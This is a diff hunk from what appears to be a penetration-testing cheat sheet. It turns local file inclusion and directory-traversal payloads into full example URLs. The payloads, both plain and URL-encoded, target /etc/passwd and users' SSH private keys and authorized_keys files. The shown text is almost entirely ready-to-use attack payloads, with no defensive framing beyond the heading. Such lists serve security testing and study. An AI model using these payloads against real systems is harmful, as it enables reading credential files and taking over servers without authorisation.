@@ -177,16 +177,16 @@ show 44a055daf7a0cd777f28f444c0d29dddjw9c9wj11
 ## Local File Inclusion - LFI
 LFI And Directory Traversal
 ```
-../../../../../../../../../etc/passwd
-../../../../../../../../../home/<user>/.ssh/authorized_keys
-../../../../../../../../../home/<user>/.ssh/id_ecdsa
-../../../../../../../../../home/<user>/.ssh/id_rsa
+http://example.com/example/?view=../../../../../../../../../etc/passwd
+http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/authorized_keys
+http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/id_ecdsa
+http://example.com/example/?view=../../../../../../../../../home/<user>/.ssh/id_rsa
 ```
 ```
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/authorized_keys
-%2e%2e/%2e%2e/%2e%2e/%2e%2e./home/<user>/.ssh/id_ecdsa
-%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/id_rsa
+http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/authorized_keys
+http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e./home/<user>/.ssh/id_ecdsa
+http://example.com/example/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/id_rsa
 ```
 
 ### PHP Wrappers
